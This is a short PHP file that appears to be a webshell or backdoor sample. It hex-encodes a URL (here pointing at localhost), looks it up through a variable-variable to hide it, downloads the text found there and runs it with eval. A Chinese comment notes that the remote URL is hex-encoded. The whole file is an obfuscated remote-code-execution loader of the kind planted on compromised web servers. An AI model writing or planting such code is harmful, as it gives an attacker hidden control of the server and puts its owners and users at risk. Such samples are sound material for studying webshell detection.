<?php
    $s9 = "687474703a2f2f6c6f63616c686f73742f746573742f6f6b6f6b2e747874";
    $m="s9";  //远程URL进行hex编码
    eval(file_get_contents(PACK('H*',$$m)));